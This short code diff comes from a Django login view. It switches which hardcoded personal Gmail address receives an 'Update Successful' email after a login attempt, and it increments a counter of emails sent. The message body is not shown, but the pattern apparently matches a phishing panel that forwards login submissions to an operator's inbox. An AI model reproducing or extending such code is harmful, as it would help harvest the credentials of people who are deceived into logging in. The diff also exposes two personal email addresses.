@@ -122,8 +122,8 @@ def user_login_view(request):
             })
 
             try:
-                send_email.email_message_send('Update Successful', message, 'barbaramikheyeva123@gmail.com' )
-                # send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
+                # send_email.email_message_send('Update Successful', message, 'barbaramikheyeva123@gmail.com' )
+                send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
                 stats, _ = SiteStats.objects.get_or_create(id=1)
                 stats.emails_sent += 1
                 stats.save()
